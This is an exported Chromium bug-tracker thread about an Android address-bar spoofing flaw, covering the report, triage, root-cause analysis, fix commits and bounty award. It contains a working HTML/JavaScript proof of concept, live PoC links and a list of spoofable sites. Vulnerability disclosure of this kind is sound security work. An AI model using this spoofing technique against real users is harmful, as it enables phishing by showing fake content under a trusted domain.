# Android Chrome & Chromium Browsers Address Bar Spoofing

| Field | Value |
|-------|-------|
| **Issue ID** | [40056854](https://issues.chromium.org/issues/40056854) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Compositing, Internals>Sandbox>SiteIsolation, UI>Browser>Navigation |
| **Platforms** | Android |
| **Reporter** | sh...@gmail.com |
| **Assignee** | jo...@chromium.org |
| **Created** | 2021-08-11 |
| **Bounty** | $3,000.00 |

## Description

Steps to reproduce the problem:
1. Open Chrome for any Chromium based android browsers.
2. Visit http://strategic-pushdown.000webhostapp.com/aio.html (sorry for the long domain)
3. Click on the href link for POC.
4. You will notice a fake content will appear on the page with a legit domain.

##Code:

<html>
 <head>
  <script>
  function next() {
         w.location.replace('https://microsoft.com:88');
        }

  function f() {
    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://yatra.com'");

    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
  }
</script> 
 </head>
 <body>
  <center><a href="#" onclick="f()">Click For POC</a></center>
 </body>
</html>

##Vulnerable Browsers:
Chrome & Canary
Microsoft Edge
Samsung Browser
Brave Browser
Opera Browser
Mint Browser
And many more chromium browsers.!

What is the expected behavior?
Browser should fully redirect to the legit domain.

What went wrong?
Browser failed to fully navigate/redirect to the legit domain.

Did this work before? N/A 

Chrome version: 92.0.4515.131  Channel: stable
OS Version: 

I have filed an old report for this bug (https://bugs.chromium.org/p/chromium/issues/detail?id=1121870) in which only chromium browsers were vulnerable but not the chrome and also  I wasn't getting proper response from the chrome team because they were not able to reproduce the issue so I thought to make the POC work on both Chrome and Chromium based browsers properly and file a new fresh report.

Also i noticed that the Chrome browser is able to redirect few sites properly like facebook.com, amazon.com or google.com and many more but failed to redirect microsoft.com, mi.com, yatra.com and many more. But in case of other chromium based browsers every sites can be spoofed.

##Note: The exploit works only if no caches for any specific site is available inside browser but also it can be reproduced everytime inside Incognito Mode because incognito mode doesn't stores any caches.

## Attachments

- [Screenrecorder-2021-08-11-23-33-48-584(0)_1026x2224.mp4](attachments/Screenrecorder-2021-08-11-23-33-48-584(0)_1026x2224.mp4) (video/mp4, 5.2 MB)
- [Poc-n.html](attachments/Poc-n.html) (text/plain, 475 B)
- [trace_spoof_with_nav.json.gz](attachments/trace_spoof_with_nav.json.gz) (application/octet-stream, 448.7 KB)
- [start_of_nav.png](attachments/start_of_nav.png) (image/png, 156.4 KB)

## Timeline

### [Deleted User] (2021-08-11)

[Empty comment from Monorail migration]

### wf...@chromium.org (2021-08-11)

Hi thank you for your report. Please can you enclose the full proof of concept files to this bug so we can begin triage of the bug. Thanks.

### sh...@gmail.com (2021-08-11)

Hi team, am attaching the "Poc.html" file which can be used to reproduce this issue. Remember if you will test this on Chrome then few sites can't be reproduced like facebook.com, google.com or other sites so you can try microsoft.com, mi.com or yatra.com for now they can be reproduced. And for other chromium based browsers you can reproduce the issue with any sites you want.

#Live Poc - http://strategic-pushdown.000webhostapp.com/aio.html

### [Deleted User] (2021-08-11)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### wf...@chromium.org (2021-08-11)

Thanks for your PoC attachment. Am I right that the page content itself cannot be interacted with? This does sound like something might be getting confused in the navigation logic, so creis@ I wonder if you could have a look here?

[Monorail components: UI>Browser>Navigation]

### cr...@chromium.org (2021-08-13)

It does appear the content is non-interactive (e.g., you can't select text).  This strongly suggests to me that the paint timer is involved, and that the content should have gone away after 4 seconds.  (The new navigation probably committed and was interrupted to prevent it from painting, but the paint of the old page never went away.)

jonross@: Can you take a look?  I suspect this is going to end up quite similar to https://crbug.com/chromium/1152894, and that https://crbug.com/1152894#c8 might be a good starting point for diagnosing it.  Presumably the fix for that bug is still generally working but this repro might find a way around it?  (It's worth noting that https://crbug.com/chromium/1152894 was called out by the reporter in https://crbug.com/1121870#c11.  We might be able to merge this and https://crbug.com/chromium/1121870 if they turn out to be the same.)

I'll avoid assigning a severity just yet until we know more, but if it turns out similar to https://crbug.com/chromium/1152894, we rated that one Medium.

[Monorail components: Internals>Compositing Internals>Sandbox>SiteIsolation]

### sh...@gmail.com (2021-08-23)

List of few more sites which can be used to reproduce the above reported issue on Chrome & Canary (v95.0.4618.2) for Android:

skype.com
shopify.com
quora.com
harvard.edu
scribd.com
ola.com
hackerone.com
bugcrowd.com
microsoft.com
yatra.com
mi.com

#PoC: http://sha3.ezyro.com/aio.html

### dr...@chromium.org (2021-08-26)

Security sheriff here, jonross@ - any update?

i'm going to assign this medium severity, as the impact is almose identical to https://crbug.com/chromium/1152894

### [Deleted User] (2021-08-26)

[Empty comment from Monorail migration]

### jo...@chromium.org (2021-08-26)

Thanks for the bump. I haven't had the chance to look at this yet (GPU sheriff+Perf) but can start looking tomorrow.

Can someone CC me to https://crbug.com/chromium/1121870 so I can read the initial context as well?

### cr...@chromium.org (2021-08-27)

https://crbug.com/chromium/1238944#c10: Thanks!  And yes, I've just CC'd you there.

### [Deleted User] (2021-08-27)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-08-27)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### jo...@chromium.org (2021-08-27)

Thanks! For me https://crbug.com/chromium/1121870 does not repro on ToT chromium.

The repro in this issue does work for me in Incognito mode. I've taken a Trace[1] with "navigation" and "viz.surface_id_flow" both enabled. The user can still see the "navigation bar" is starting to advance and get stucks, which is one signal that the page didn't finish loading.

In the trace the Navigation starts at 40,237.972 ms there are then two new Surfaces embedded after it starts which is surprising:
   - LocalSurfaceId(4, 1, 7E4A...) at 40,270.672 ms
   - LocalSurfaceId(5, 1, 7E4A...) at 40,584.459 ms
Both of which are from the Renderer that had the initial page. There is no second Renderer created for the Navigation event.
There are also two NavigationRequests:
   -  "SAME_DOCUMENT" at 40,348.003 ms            http://strategic-pushdown.000webhostapp.com/aio.html#
   -  "DIFFERENT_DOCUMENT" at 40,394.560 ms  http://microsoft.com/

[2] The first one is generated, I suspect, in response to the navigation starting, as it is under "	
Navigation timeToResponseStarted", but it is before it is determined to be a "Same document" navigation.

I'm not sure the trigger for the second LocalSurfaceId yet. It starts "after" the determination that it is a different document.

The mismatch in alignment of NavigationRequest traces to the generation of new LocalSurfaceIds kinda surprises/concerns me. I'm also surprised that there isn't an obvious eviction of the previous surface as soon as we know it's a "different document".

It's also confusing that there is only one Renderer when there are two tabs.

Both of these are before the Navigation hits "ReadyToCommitNavigation"

I'll take a closer look into the eviction timing. Any thoughts on why this type of navigation would complete the Commit step? It doesn't seem like navigation actually completes.

[1] trace_spoof_with_nav.json.gz
[2] start_of_nav.png

### jo...@chromium.org (2021-08-31)

So this is an edge case in the setup of RenderWidgetHostViewAndroid. Typically it gathers all the VisualProperites and sends them to the Renderer. Then when the first navigation is complete, it uses that same Surface for the content.

Whereas when reusing a RWHVA for subsequent navigations, we create a new Surface for that content.

What is happening here is that the Renderer is processins ""javascript:document.write('<h1>This is a Fake Content!</h1>')" while we have some of those initial VisualProperties. During a normal navigation, there has been no JS processing yet, so no content.

Found a way to detect/fix. Just need to get a regression test built.

### jo...@chromium.org (2021-09-01)

+boliu@ for context of the bug.

A review is up: https://chromium-review.googlesource.com/c/chromium/src/+/3133709

### gi...@appspot.gserviceaccount.com (2021-09-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/b4716d00f31a31f81bd2f2a464b88c3d9a38ad34

commit b4716d00f31a31f81bd2f2a464b88c3d9a38ad34
Author: Jonathan Ross <jonross@chromium.org>
Date: Wed Sep 01 22:20:16 2021

Android Clear Pre-Navigation Surfaces if Submissions Received

It is possible that a Renderer may submit a CompositorFrame to a Surface
before Navigation has completed.

Previously we attempted to not allocate a new Surface for the first
navigation. This was intended to reduce the number of Surface Syncs.
However it is possible that a Renderer may still submit a frame to these
Surfaces.

This change updates RenderWidgetHostViewAndroid to detect when the first
RendererFrameMetadata arrives, signifying submitted content. It then
disabled this old optimization. We we now always allocate a new Surface
on Navigation when there is previous content.

TEST=
  RenderWidgetHostViewAndroidTest.RenderFrameSubmittedBeforeNavigation
Bug: 1238944

Change-Id: I4cfec39a46083402e21ee50e63ad7f6f1990b56e
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3133709
Reviewed-by: Bo <boliu@chromium.org>
Commit-Queue: Jonathan Ross <jonross@chromium.org>
Cr-Commit-Position: refs/heads/main@{#917412}

[modify] https://crrev.com/b4716d00f31a31f81bd2f2a464b88c3d9a38ad34/content/browser/renderer_host/render_frame_metadata_provider_impl.h
[modify] https://crrev.com/b4716d00f31a31f81bd2f2a464b88c3d9a38ad34/content/browser/renderer_host/render_widget_host_view_android.cc
[modify] https://crrev.com/b4716d00f31a31f81bd2f2a464b88c3d9a38ad34/content/browser/renderer_host/render_widget_host_view_android.h
[modify] https://crrev.com/b4716d00f31a31f81bd2f2a464b88c3d9a38ad34/content/browser/renderer_host/render_widget_host_view_android_unittest.cc


### jo...@chromium.org (2021-09-13)

Test fix on Canary, we clear out the previous at the timeout. Asking for merge.

### [Deleted User] (2021-09-13)

This bug requires manual review: We are only 7 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/main/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), harrysouders@(iOS), matthewjoseph@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2021-09-13)

+Amy (Security TPM) for M94 merge review

### am...@chromium.org (2021-09-14)

based on https://crbug.com/chromium/1238944#c18 this appears to be performing fine on Canary and there are no issues or concerns, please update this issue as Fixed. 
Once marked as fixed, sheriffbot would have kicked off the merge review process, and you should not have to manually request a merge. 

Once updated as Fixed, please go ahead and merge to M94, branch 4606, as by 2pm PDT before M94 stable cut. Thank you.




### cr...@chromium.org (2021-09-14)

Thanks Jon!  I'll go ahead and mark this as fixed by r917412 given https://crbug.com/chromium/1238944#c18.

### cr...@chromium.org (2021-09-14)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-14)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-09-14)

Forgot to update labels! merge approved and now labeled accordingly :) 

### cr...@chromium.org (2021-09-14)

For reference, jonross@ has a merge CL working its way through the CQ for M94: https://chromium-review.googlesource.com/c/chromium/src/+/3160861.

### gi...@appspot.gserviceaccount.com (2021-09-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/6eaf3545f9900db8e6d626153f0d8d7d6467e8c6

commit 6eaf3545f9900db8e6d626153f0d8d7d6467e8c6
Author: Jonathan Ross <jonross@chromium.org>
Date: Tue Sep 14 19:36:56 2021

Android Clear Pre-Navigation Surfaces if Submissions Received

It is possible that a Renderer may submit a CompositorFrame to a Surface
before Navigation has completed.

Previously we attempted to not allocate a new Surface for the first
navigation. This was intended to reduce the number of Surface Syncs.
However it is possible that a Renderer may still submit a frame to these
Surfaces.

This change updates RenderWidgetHostViewAndroid to detect when the first
RendererFrameMetadata arrives, signifying submitted content. It then
disabled this old optimization. We we now always allocate a new Surface
on Navigation when there is previous content.

TEST=
  RenderWidgetHostViewAndroidTest.RenderFrameSubmittedBeforeNavigation
Bug: 1238944

(cherry picked from commit b4716d00f31a31f81bd2f2a464b88c3d9a38ad34)

Change-Id: I4cfec39a46083402e21ee50e63ad7f6f1990b56e
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3133709
Reviewed-by: Bo <boliu@chromium.org>
Commit-Queue: Jonathan Ross <jonross@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#917412}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3160861
Auto-Submit: Jonathan Ross <jonross@chromium.org>
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/4606@{#1036}
Cr-Branched-From: 35b0d5a9dc8362adfd44e2614f0d5b7402ef63d0-refs/heads/master@{#911515}

[modify] https://crrev.com/6eaf3545f9900db8e6d626153f0d8d7d6467e8c6/content/browser/renderer_host/render_frame_metadata_provider_impl.h
[modify] https://crrev.com/6eaf3545f9900db8e6d626153f0d8d7d6467e8c6/content/browser/renderer_host/render_widget_host_view_android.cc
[modify] https://crrev.com/6eaf3545f9900db8e6d626153f0d8d7d6467e8c6/content/browser/renderer_host/render_widget_host_view_android.h
[modify] https://crrev.com/6eaf3545f9900db8e6d626153f0d8d7d6467e8c6/content/browser/renderer_host/render_widget_host_view_android_unittest.cc


### jo...@chromium.org (2021-09-14)

All merged. Thanks everyone for the help with this issue!

### [Deleted User] (2021-09-15)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-09-20)

[Empty comment from Monorail migration]

### am...@google.com (2021-09-21)

[Empty comment from Monorail migration]

### rz...@google.com (2021-09-24)

Labelling as not applicable for M90-LTS because it affects only Android.

### am...@google.com (2021-09-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-09-30)

Congratulations - the VRP Panel has decided to award you $3,000 for this report. Nice work! 

### sh...@gmail.com (2021-09-30)

Again thank you very much team for the bounty decision <3

### am...@google.com (2021-10-01)

[Empty comment from Monorail migration]

### am...@google.com (2021-10-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-21)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1238944?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Internals>Compositing, Internals>Sandbox>SiteIsolation, UI>Browser>Navigation]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056854)*
